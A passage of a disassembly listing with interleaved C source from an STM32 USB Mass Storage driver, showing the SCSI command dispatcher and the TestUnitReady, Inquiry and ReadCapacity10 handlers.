 8009b88:	08009d3d 	.word	0x08009d3d
 8009b8c:	08009d3d 	.word	0x08009d3d
 8009b90:	08009d3d 	.word	0x08009d3d
 8009b94:	08009d3d 	.word	0x08009d3d
 8009b98:	08009d3d 	.word	0x08009d3d
 8009b9c:	08009d3d 	.word	0x08009d3d
 8009ba0:	08009d3d 	.word	0x08009d3d
 8009ba4:	08009d3d 	.word	0x08009d3d
 8009ba8:	08009d3d 	.word	0x08009d3d
 8009bac:	08009d3d 	.word	0x08009d3d
 8009bb0:	08009d3d 	.word	0x08009d3d
 8009bb4:	08009d3d 	.word	0x08009d3d
 8009bb8:	08009d3d 	.word	0x08009d3d
 8009bbc:	08009d3d 	.word	0x08009d3d
 8009bc0:	08009d3d 	.word	0x08009d3d
 8009bc4:	08009d3d 	.word	0x08009d3d
 8009bc8:	08009d3d 	.word	0x08009d3d
 8009bcc:	08009d3d 	.word	0x08009d3d
 8009bd0:	08009d3d 	.word	0x08009d3d
 8009bd4:	08009d3d 	.word	0x08009d3d
 8009bd8:	08009d3d 	.word	0x08009d3d
 8009bdc:	08009d3d 	.word	0x08009d3d
 8009be0:	08009d3d 	.word	0x08009d3d
 8009be4:	08009d3d 	.word	0x08009d3d
 8009be8:	08009d3d 	.word	0x08009d3d
 8009bec:	08009d3d 	.word	0x08009d3d
 8009bf0:	08009d3d 	.word	0x08009d3d
 8009bf4:	08009d3d 	.word	0x08009d3d
 8009bf8:	08009d3d 	.word	0x08009d3d
 8009bfc:	08009d3d 	.word	0x08009d3d
 8009c00:	08009d3d 	.word	0x08009d3d
 8009c04:	08009d3d 	.word	0x08009d3d
 8009c08:	08009d3d 	.word	0x08009d3d
 8009c0c:	08009d3d 	.word	0x08009d3d
 8009c10:	08009d3d 	.word	0x08009d3d
 8009c14:	08009d3d 	.word	0x08009d3d
 8009c18:	08009d3d 	.word	0x08009d3d
 8009c1c:	08009d3d 	.word	0x08009d3d
 8009c20:	08009d3d 	.word	0x08009d3d
 8009c24:	08009c9b 	.word	0x08009c9b
 8009c28:	2b9e      	cmp	r3, #158	; 0x9e
 8009c2a:	d051      	beq.n	8009cd0 <SCSI_ProcessCmd+0x274>
 8009c2c:	e086      	b.n	8009d3c <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 8009c2e:	7afb      	ldrb	r3, [r7, #11]
 8009c30:	687a      	ldr	r2, [r7, #4]
 8009c32:	4619      	mov	r1, r3
 8009c34:	68f8      	ldr	r0, [r7, #12]
 8009c36:	f000 f893 	bl	8009d60 <SCSI_TestUnitReady>
 8009c3a:	4603      	mov	r3, r0
 8009c3c:	75fb      	strb	r3, [r7, #23]
      break;
 8009c3e:	e089      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009c40:	7afb      	ldrb	r3, [r7, #11]
 8009c42:	687a      	ldr	r2, [r7, #4]
 8009c44:	4619      	mov	r1, r3
 8009c46:	68f8      	ldr	r0, [r7, #12]
 8009c48:	f000 fb9a 	bl	800a380 <SCSI_RequestSense>
 8009c4c:	4603      	mov	r3, r0
 8009c4e:	75fb      	strb	r3, [r7, #23]
      break;
 8009c50:	e080      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 8009c52:	7afb      	ldrb	r3, [r7, #11]
 8009c54:	687a      	ldr	r2, [r7, #4]
 8009c56:	4619      	mov	r1, r3
 8009c58:	68f8      	ldr	r0, [r7, #12]
 8009c5a:	f000 f8df 	bl	8009e1c <SCSI_Inquiry>
 8009c5e:	4603      	mov	r3, r0
 8009c60:	75fb      	strb	r3, [r7, #23]
      break;
 8009c62:	e077      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 8009c64:	7afb      	ldrb	r3, [r7, #11]
 8009c66:	687a      	ldr	r2, [r7, #4]
 8009c68:	4619      	mov	r1, r3
 8009c6a:	68f8      	ldr	r0, [r7, #12]
 8009c6c:	f000 fc7e 	bl	800a56c <SCSI_StartStopUnit>
 8009c70:	4603      	mov	r3, r0
 8009c72:	75fb      	strb	r3, [r7, #23]
      break;
 8009c74:	e06e      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 8009c76:	7afb      	ldrb	r3, [r7, #11]
 8009c78:	687a      	ldr	r2, [r7, #4]
 8009c7a:	4619      	mov	r1, r3
 8009c7c:	68f8      	ldr	r0, [r7, #12]
 8009c7e:	f000 fcd2 	bl	800a626 <SCSI_AllowPreventRemovable>
 8009c82:	4603      	mov	r3, r0
 8009c84:	75fb      	strb	r3, [r7, #23]
      break;
 8009c86:	e065      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 8009c88:	7afb      	ldrb	r3, [r7, #11]
 8009c8a:	687a      	ldr	r2, [r7, #4]
 8009c8c:	4619      	mov	r1, r3
 8009c8e:	68f8      	ldr	r0, [r7, #12]
 8009c90:	f000 fb16 	bl	800a2c0 <SCSI_ModeSense6>
 8009c94:	4603      	mov	r3, r0
 8009c96:	75fb      	strb	r3, [r7, #23]
      break;
 8009c98:	e05c      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 8009c9a:	7afb      	ldrb	r3, [r7, #11]
 8009c9c:	687a      	ldr	r2, [r7, #4]
 8009c9e:	4619      	mov	r1, r3
 8009ca0:	68f8      	ldr	r0, [r7, #12]
 8009ca2:	f000 fb3d 	bl	800a320 <SCSI_ModeSense10>
 8009ca6:	4603      	mov	r3, r0
 8009ca8:	75fb      	strb	r3, [r7, #23]
      break;
 8009caa:	e053      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 8009cac:	7afb      	ldrb	r3, [r7, #11]
 8009cae:	687a      	ldr	r2, [r7, #4]
 8009cb0:	4619      	mov	r1, r3
 8009cb2:	68f8      	ldr	r0, [r7, #12]
 8009cb4:	f000 fa86 	bl	800a1c4 <SCSI_ReadFormatCapacity>
 8009cb8:	4603      	mov	r3, r0
 8009cba:	75fb      	strb	r3, [r7, #23]
      break;
 8009cbc:	e04a      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009cbe:	7afb      	ldrb	r3, [r7, #11]
 8009cc0:	687a      	ldr	r2, [r7, #4]
 8009cc2:	4619      	mov	r1, r3
 8009cc4:	68f8      	ldr	r0, [r7, #12]
 8009cc6:	f000 f929 	bl	8009f1c <SCSI_ReadCapacity10>
 8009cca:	4603      	mov	r3, r0
 8009ccc:	75fb      	strb	r3, [r7, #23]
      break;
 8009cce:	e041      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009cd0:	7afb      	ldrb	r3, [r7, #11]
 8009cd2:	687a      	ldr	r2, [r7, #4]
 8009cd4:	4619      	mov	r1, r3
 8009cd6:	68f8      	ldr	r0, [r7, #12]
 8009cd8:	f000 f9af 	bl	800a03a <SCSI_ReadCapacity16>
 8009cdc:	4603      	mov	r3, r0
 8009cde:	75fb      	strb	r3, [r7, #23]
      break;
 8009ce0:	e038      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009ce2:	7afb      	ldrb	r3, [r7, #11]
 8009ce4:	687a      	ldr	r2, [r7, #4]
 8009ce6:	4619      	mov	r1, r3
 8009ce8:	68f8      	ldr	r0, [r7, #12]
 8009cea:	f000 fccd 	bl	800a688 <SCSI_Read10>
 8009cee:	4603      	mov	r3, r0
 8009cf0:	75fb      	strb	r3, [r7, #23]
      break;
 8009cf2:	e02f      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009cf4:	7afb      	ldrb	r3, [r7, #11]
 8009cf6:	687a      	ldr	r2, [r7, #4]
 8009cf8:	4619      	mov	r1, r3
 8009cfa:	68f8      	ldr	r0, [r7, #12]
 8009cfc:	f000 fd7b 	bl	800a7f6 <SCSI_Read12>
 8009d00:	4603      	mov	r3, r0
 8009d02:	75fb      	strb	r3, [r7, #23]
      break;
 8009d04:	e026      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009d06:	7afb      	ldrb	r3, [r7, #11]
 8009d08:	687a      	ldr	r2, [r7, #4]
 8009d0a:	4619      	mov	r1, r3
 8009d0c:	68f8      	ldr	r0, [r7, #12]
 8009d0e:	f000 fe33 	bl	800a978 <SCSI_Write10>
 8009d12:	4603      	mov	r3, r0
 8009d14:	75fb      	strb	r3, [r7, #23]
      break;
 8009d16:	e01d      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009d18:	7afb      	ldrb	r3, [r7, #11]
 8009d1a:	687a      	ldr	r2, [r7, #4]
 8009d1c:	4619      	mov	r1, r3
 8009d1e:	68f8      	ldr	r0, [r7, #12]
 8009d20:	f000 ff0e 	bl	800ab40 <SCSI_Write12>
 8009d24:	4603      	mov	r3, r0
 8009d26:	75fb      	strb	r3, [r7, #23]
      break;
 8009d28:	e014      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009d2a:	7afb      	ldrb	r3, [r7, #11]
 8009d2c:	687a      	ldr	r2, [r7, #4]
 8009d2e:	4619      	mov	r1, r3
 8009d30:	68f8      	ldr	r0, [r7, #12]
 8009d32:	f000 fff9 	bl	800ad28 <SCSI_Verify10>
 8009d36:	4603      	mov	r3, r0
 8009d38:	75fb      	strb	r3, [r7, #23]
      break;
 8009d3a:	e00b      	b.n	8009d54 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009d3c:	7af9      	ldrb	r1, [r7, #11]
 8009d3e:	2320      	movs	r3, #32
 8009d40:	2205      	movs	r2, #5
 8009d42:	68f8      	ldr	r0, [r7, #12]
 8009d44:	f000 fbb6 	bl	800a4b4 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009d48:	693b      	ldr	r3, [r7, #16]
 8009d4a:	2202      	movs	r2, #2
 8009d4c:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009d4e:	23ff      	movs	r3, #255	; 0xff
 8009d50:	75fb      	strb	r3, [r7, #23]
      break;
 8009d52:	bf00      	nop
  }

  return ret;
 8009d54:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009d58:	4618      	mov	r0, r3
 8009d5a:	3718      	adds	r7, #24
 8009d5c:	46bd      	mov	sp, r7
 8009d5e:	bd80      	pop	{r7, pc}

08009d60 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009d60:	b580      	push	{r7, lr}
 8009d62:	b086      	sub	sp, #24
 8009d64:	af00      	add	r7, sp, #0
 8009d66:	60f8      	str	r0, [r7, #12]
 8009d68:	460b      	mov	r3, r1
 8009d6a:	607a      	str	r2, [r7, #4]
 8009d6c:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009d6e:	68fb      	ldr	r3, [r7, #12]
 8009d70:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009d74:	68fb      	ldr	r3, [r7, #12]
 8009d76:	32b0      	adds	r2, #176	; 0xb0
 8009d78:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009d7c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009d7e:	697b      	ldr	r3, [r7, #20]
 8009d80:	2b00      	cmp	r3, #0
 8009d82:	d102      	bne.n	8009d8a <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009d84:	f04f 33ff 	mov.w	r3, #4294967295
 8009d88:	e043      	b.n	8009e12 <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009d8a:	697b      	ldr	r3, [r7, #20]
 8009d8c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d90:	699b      	ldr	r3, [r3, #24]
 8009d92:	2b00      	cmp	r3, #0
 8009d94:	d00b      	beq.n	8009dae <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009d96:	697b      	ldr	r3, [r7, #20]
 8009d98:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d9c:	7f59      	ldrb	r1, [r3, #29]
 8009d9e:	2320      	movs	r3, #32
 8009da0:	2205      	movs	r2, #5
 8009da2:	68f8      	ldr	r0, [r7, #12]
 8009da4:	f000 fb86 	bl	800a4b4 <SCSI_SenseCode>

    return -1;
 8009da8:	f04f 33ff 	mov.w	r3, #4294967295
 8009dac:	e031      	b.n	8009e12 <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009dae:	697b      	ldr	r3, [r7, #20]
 8009db0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009db4:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009db8:	2b02      	cmp	r3, #2
 8009dba:	d10b      	bne.n	8009dd4 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009dbc:	7af9      	ldrb	r1, [r7, #11]
 8009dbe:	233a      	movs	r3, #58	; 0x3a
 8009dc0:	2202      	movs	r2, #2
 8009dc2:	68f8      	ldr	r0, [r7, #12]
 8009dc4:	f000 fb76 	bl	800a4b4 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009dc8:	697b      	ldr	r3, [r7, #20]
 8009dca:	2205      	movs	r2, #5
 8009dcc:	721a      	strb	r2, [r3, #8]
    return -1;
 8009dce:	f04f 33ff 	mov.w	r3, #4294967295
 8009dd2:	e01e      	b.n	8009e12 <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009dd4:	68fb      	ldr	r3, [r7, #12]
 8009dd6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009dda:	68fa      	ldr	r2, [r7, #12]
 8009ddc:	33b0      	adds	r3, #176	; 0xb0
 8009dde:	009b      	lsls	r3, r3, #2
 8009de0:	4413      	add	r3, r2
 8009de2:	685b      	ldr	r3, [r3, #4]
 8009de4:	689b      	ldr	r3, [r3, #8]
 8009de6:	7afa      	ldrb	r2, [r7, #11]
 8009de8:	4610      	mov	r0, r2
 8009dea:	4798      	blx	r3
 8009dec:	4603      	mov	r3, r0
 8009dee:	2b00      	cmp	r3, #0
 8009df0:	d00b      	beq.n	8009e0a <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009df2:	7af9      	ldrb	r1, [r7, #11]
 8009df4:	233a      	movs	r3, #58	; 0x3a
 8009df6:	2202      	movs	r2, #2
 8009df8:	68f8      	ldr	r0, [r7, #12]
 8009dfa:	f000 fb5b 	bl	800a4b4 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009dfe:	697b      	ldr	r3, [r7, #20]
 8009e00:	2205      	movs	r2, #5
 8009e02:	721a      	strb	r2, [r3, #8]

    return -1;
 8009e04:	f04f 33ff 	mov.w	r3, #4294967295
 8009e08:	e003      	b.n	8009e12 <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009e0a:	697b      	ldr	r3, [r7, #20]
 8009e0c:	2200      	movs	r2, #0
 8009e0e:	60da      	str	r2, [r3, #12]

  return 0;
 8009e10:	2300      	movs	r3, #0
}
 8009e12:	4618      	mov	r0, r3
 8009e14:	3718      	adds	r7, #24
 8009e16:	46bd      	mov	sp, r7
 8009e18:	bd80      	pop	{r7, pc}
	...

08009e1c <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009e1c:	b580      	push	{r7, lr}
 8009e1e:	b088      	sub	sp, #32
 8009e20:	af00      	add	r7, sp, #0
 8009e22:	60f8      	str	r0, [r7, #12]
 8009e24:	460b      	mov	r3, r1
 8009e26:	607a      	str	r2, [r7, #4]
 8009e28:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009e2a:	68fb      	ldr	r3, [r7, #12]
 8009e2c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009e30:	68fb      	ldr	r3, [r7, #12]
 8009e32:	32b0      	adds	r2, #176	; 0xb0
 8009e34:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009e38:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009e3a:	69bb      	ldr	r3, [r7, #24]
 8009e3c:	2b00      	cmp	r3, #0
 8009e3e:	d102      	bne.n	8009e46 <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009e40:	f04f 33ff 	mov.w	r3, #4294967295
 8009e44:	e062      	b.n	8009f0c <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009e46:	69bb      	ldr	r3, [r7, #24]
 8009e48:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e4c:	699b      	ldr	r3, [r3, #24]
 8009e4e:	2b00      	cmp	r3, #0
 8009e50:	d10b      	bne.n	8009e6a <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009e52:	69bb      	ldr	r3, [r7, #24]
 8009e54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e58:	7f59      	ldrb	r1, [r3, #29]
 8009e5a:	2320      	movs	r3, #32
 8009e5c:	2205      	movs	r2, #5
 8009e5e:	68f8      	ldr	r0, [r7, #12]
 8009e60:	f000 fb28 	bl	800a4b4 <SCSI_SenseCode>
    return -1;
 8009e64:	f04f 33ff 	mov.w	r3, #4294967295
 8009e68:	e050      	b.n	8009f0c <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009e6a:	687b      	ldr	r3, [r7, #4]
 8009e6c:	3301      	adds	r3, #1
 8009e6e:	781b      	ldrb	r3, [r3, #0]
 8009e70:	f003 0301 	and.w	r3, r3, #1
 8009e74:	2b00      	cmp	r3, #0
 8009e76:	d021      	beq.n	8009ebc <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009e78:	687b      	ldr	r3, [r7, #4]
 8009e7a:	3302      	adds	r3, #2
 8009e7c:	781b      	ldrb	r3, [r3, #0]
 8009e7e:	2b00      	cmp	r3, #0
 8009e80:	d105      	bne.n	8009e8e <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009e82:	2206      	movs	r2, #6
 8009e84:	4923      	ldr	r1, [pc, #140]	; (8009f14 <SCSI_Inquiry+0xf8>)
 8009e86:	69b8      	ldr	r0, [r7, #24]
 8009e88:	f001 f8fa 	bl	800b080 <SCSI_UpdateBotData>
 8009e8c:	e03d      	b.n	8009f0a <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009e8e:	687b      	ldr	r3, [r7, #4]
 8009e90:	3302      	adds	r3, #2
 8009e92:	781b      	ldrb	r3, [r3, #0]
 8009e94:	2b80      	cmp	r3, #128	; 0x80
 8009e96:	d105      	bne.n	8009ea4 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009e98:	2208      	movs	r2, #8
 8009e9a:	491f      	ldr	r1, [pc, #124]	; (8009f18 <SCSI_Inquiry+0xfc>)
 8009e9c:	69b8      	ldr	r0, [r7, #24]
 8009e9e:	f001 f8ef 	bl	800b080 <SCSI_UpdateBotData>
 8009ea2:	e032      	b.n	8009f0a <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009ea4:	69bb      	ldr	r3, [r7, #24]
 8009ea6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009eaa:	7f59      	ldrb	r1, [r3, #29]
 8009eac:	2324      	movs	r3, #36	; 0x24
 8009eae:	2205      	movs	r2, #5
 8009eb0:	68f8      	ldr	r0, [r7, #12]
 8009eb2:	f000 faff 	bl	800a4b4 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009eb6:	f04f 33ff 	mov.w	r3, #4294967295
 8009eba:	e027      	b.n	8009f0c <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009ebc:	68fb      	ldr	r3, [r7, #12]
 8009ebe:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009ec2:	68fa      	ldr	r2, [r7, #12]
 8009ec4:	33b0      	adds	r3, #176	; 0xb0
 8009ec6:	009b      	lsls	r3, r3, #2
 8009ec8:	4413      	add	r3, r2
 8009eca:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009ecc:	69d9      	ldr	r1, [r3, #28]
 8009ece:	7afa      	ldrb	r2, [r7, #11]
 8009ed0:	4613      	mov	r3, r2
 8009ed2:	00db      	lsls	r3, r3, #3
 8009ed4:	4413      	add	r3, r2
 8009ed6:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009ed8:	440b      	add	r3, r1
 8009eda:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009edc:	697b      	ldr	r3, [r7, #20]
 8009ede:	3304      	adds	r3, #4
 8009ee0:	781b      	ldrb	r3, [r3, #0]
 8009ee2:	b29b      	uxth	r3, r3
 8009ee4:	3305      	adds	r3, #5
 8009ee6:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009ee8:	687b      	ldr	r3, [r7, #4]
 8009eea:	3304      	adds	r3, #4
 8009eec:	781b      	ldrb	r3, [r3, #0]
 8009eee:	b29b      	uxth	r3, r3
 8009ef0:	8bfa      	ldrh	r2, [r7, #30]
 8009ef2:	429a      	cmp	r2, r3
 8009ef4:	d303      	bcc.n	8009efe <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009ef6:	687b      	ldr	r3, [r7, #4]
 8009ef8:	3304      	adds	r3, #4
 8009efa:	781b      	ldrb	r3, [r3, #0]
 8009efc:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009efe:	8bfb      	ldrh	r3, [r7, #30]
 8009f00:	461a      	mov	r2, r3
 8009f02:	6979      	ldr	r1, [r7, #20]
 8009f04:	69b8      	ldr	r0, [r7, #24]
 8009f06:	f001 f8bb 	bl	800b080 <SCSI_UpdateBotData>
  }

  return 0;
 8009f0a:	2300      	movs	r3, #0
}
 8009f0c:	4618      	mov	r0, r3
 8009f0e:	3720      	adds	r7, #32
 8009f10:	46bd      	mov	sp, r7
 8009f12:	bd80      	pop	{r7, pc}
 8009f14:	2000010c 	.word	0x2000010c
 8009f18:	20000114 	.word	0x20000114

08009f1c <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f1c:	b590      	push	{r4, r7, lr}
 8009f1e:	b087      	sub	sp, #28
 8009f20:	af00      	add	r7, sp, #0
 8009f22:	60f8      	str	r0, [r7, #12]
 8009f24:	460b      	mov	r3, r1
 8009f26:	607a      	str	r2, [r7, #4]
 8009f28:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f2a:	68fb      	ldr	r3, [r7, #12]
 8009f2c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009f30:	68fb      	ldr	r3, [r7, #12]
 8009f32:	32b0      	adds	r2, #176	; 0xb0
 8009f34:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009f38:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009f3a:	697b      	ldr	r3, [r7, #20]
 8009f3c:	2b00      	cmp	r3, #0
 8009f3e:	d102      	bne.n	8009f46 <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009f40:	f04f 33ff 	mov.w	r3, #4294967295
 8009f44:	e075      	b.n	800a032 <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009f46:	68fb      	ldr	r3, [r7, #12]
 8009f48:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009f4c:	68fa      	ldr	r2, [r7, #12]
 8009f4e:	33b0      	adds	r3, #176	; 0xb0
 8009f50:	009b      	lsls	r3, r3, #2
 8009f52:	4413      	add	r3, r2
 8009f54:	685b      	ldr	r3, [r3, #4]
 8009f56:	685c      	ldr	r4, [r3, #4]
 8009f58:	697b      	ldr	r3, [r7, #20]
 8009f5a:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009f5e:	3308      	adds	r3, #8
 8009f60:	697a      	ldr	r2, [r7, #20]
 8009f62:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009f66:	3204      	adds	r2, #4
 8009f68:	7af8      	ldrb	r0, [r7, #11]
 8009f6a:	4619      	mov	r1, r3
 8009f6c:	47a0      	blx	r4
 8009f6e:	4603      	mov	r3, r0
 8009f70:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009f72:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009f76:	2b00      	cmp	r3, #0
 8009f78:	d106      	bne.n	8009f88 <SCSI_ReadCapacity10+0x6c>
 8009f7a:	697b      	ldr	r3, [r7, #20]
 8009f7c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f80:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009f84:	2b02      	cmp	r3, #2
 8009f86:	d108      	bne.n	8009f9a <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009f88:	7af9      	ldrb	r1, [r7, #11]
 8009f8a:	233a      	movs	r3, #58	; 0x3a
 8009f8c:	2202      	movs	r2, #2
 8009f8e:	68f8      	ldr	r0, [r7, #12]
 8009f90:	f000 fa90 	bl	800a4b4 <SCSI_SenseCode>
    return -1;
 8009f94:	f04f 33ff 	mov.w	r3, #4294967295
 8009f98:	e04b      	b.n	800a032 <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009f9a:	697b      	ldr	r3, [r7, #20]
 8009f9c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fa0:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009fa2:	3b01      	subs	r3, #1
 8009fa4:	0e1b      	lsrs	r3, r3, #24
 8009fa6:	b2da      	uxtb	r2, r3
 8009fa8:	697b      	ldr	r3, [r7, #20]
 8009faa:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009fac:	697b      	ldr	r3, [r7, #20]
 8009fae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fb2:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009fb4:	3b01      	subs	r3, #1
 8009fb6:	0c1b      	lsrs	r3, r3, #16
